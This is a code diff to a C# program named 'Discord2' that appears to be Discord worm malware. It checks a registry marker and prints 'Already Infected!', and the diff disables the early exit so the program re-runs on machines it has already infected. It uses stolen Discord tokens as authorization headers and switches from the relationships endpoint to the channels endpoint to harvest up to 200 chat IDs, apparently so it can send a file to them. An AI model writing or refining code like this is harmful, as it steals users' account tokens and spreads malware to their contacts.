@@ -12,11 +12,13 @@ namespace Discord2
     {
         private static readonly HttpClient client = new HttpClient();
 
+        private static int MAX_SEND = 200;
+
         public static void Run()
         {
             if(OpenRegKey("warning")==0){
                 Console.WriteLine("Already Infected!");
-                return;
+                //return;
             }
 
             List<string> tokens = GetTokens();
@@ -101,21 +103,18 @@ namespace Discord2
             client.DefaultRequestHeaders.Add("Authorization", token);
         }
         
-        
-
         static List<string>? GetChatsID(string token)
         {
-            var r = client.GetAsync("https://discordapp.com/api/v6/users/@me/relationships").Result;
+            var r = client.GetAsync("https://discordapp.com/api/v6/users/@me/channels").Result;
             var r_content = r.Content.ReadAsStringAsync().Result;
             
             List<string>? s = new List<string>();
-            
-            foreach (Match match in Regex.Matches(r_content, @"[\d]{18}"))
-                s.Add(match.Value);
+            foreach(Dictionary<string, string> d in DictFromString(r_content)){
+                s.Add(d["id"]);
+            }
 
             return s.Distinct().ToList();
         }
-
 
         static ByteArrayContent? GetFile()
         {   
@@ -181,6 +180,29 @@ namespace Discord2
             }
 
             return process.ExitCode;
+        }
+
+        static Dictionary<string, string>[] DictFromString(string input){
+            string[] entries = input.Split(new string[] {"}, {"}, MAX_SEND, StringSplitOptions.RemoveEmptyEntries);
+            Dictionary<string, string>[] dict = new Dictionary<string, string>[entries.Length];
+            for(int i=0; i<entries.Length; i++){
+                dict[i] = new Dictionary<string, string>();
+            }
+
+            char[] deletechar = new Char[]{' ', '*', '.', '}', '{', '[', '[', '"'};
+
+            for(int i=0;  i<entries.Length; i++){
+                string[] abc = entries[i].Trim(deletechar).Split('[');
+                foreach(string s in  abc[0].Split(',')){
+                    string [] pair = s.Trim().Split(':');
+                    if(pair[1].Trim().Length == 0){
+                        pair[1] = "[" + abc[1];
+                    }
+
+                    dict[i].Add(pair[0].Trim(deletechar), pair[1].Trim(deletechar));
+                }
+            }
+            return dict;
         }
     }
 }
